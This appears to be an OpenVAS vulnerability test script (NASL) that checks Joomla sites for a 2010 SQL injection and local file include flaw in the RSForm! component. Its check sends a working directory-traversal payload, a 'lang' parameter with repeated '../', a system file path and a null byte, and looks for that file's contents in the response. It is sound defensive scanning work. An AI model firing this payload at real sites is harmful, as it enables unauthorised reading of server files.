###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_rsform_44724.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# RSForm! Component for Joomla! 'lang' Parameter SQL Injection and Local File Include Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "The RSForm! Component for Joomla! is prone to an SQL-injection
vulnerability and a local file-include vulnerability because it fails
to sufficiently sanitize user-supplied data.

An attacker can exploit these vulnerabilities to compromise the
application, access or modify data, or exploit latent vulnerabilities
in the underlying database. By using directory-traversal strings to
execute local script code in the context of the application, the
attacker may be able to obtain sensitive information that may aid in
further attacks.

RSForm! Component 1.0.5 is vulnerable; other versions may also
be affected.";

tag_solution = "Vendor updates are available. Please contact the vendor for more
information.";

if (description)
{
 script_id(100921);
 script_version("$Revision: 7577 $");
 script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
 script_tag(name:"creation_date", value:"2010-11-30 12:57:59 +0100 (Tue, 30 Nov 2010)");
 script_bugtraq_id(44724);
 script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_name("RSForm! Component for Joomla! 'lang' Parameter SQL Injection and Local File Include Vulnerabilities");

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/44724");
 script_xref(name : "URL" , value : "http://www.rsjoomla.com/joomla-components/rsform.html");
 script_xref(name : "URL" , value : "http://www.rsjoomla.com/customer-support/documentations/12-general-overview-of-the-component/46-rsform-changelog.html");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("joomla_detect.nasl", "os_detection.nasl");
 script_require_ports("Services/www", 80);
 script_mandatory_keys("joomla/installed");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("version_func.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

if(!dir = get_dir_from_kb(port:port,app:"joomla"))exit(0);
files = traversal_files();

foreach file (keys(files)) {
   
  url = string(dir,"/index.php?option=com_forme&func=thankyou&lang=",crap(data:"../",length:3*15),files[file],"%00"); 

  if(http_vuln_check(port:port, url:url,pattern:file)) {
     
    security_message(port:port);
    exit(0);

  }
}

exit(0);

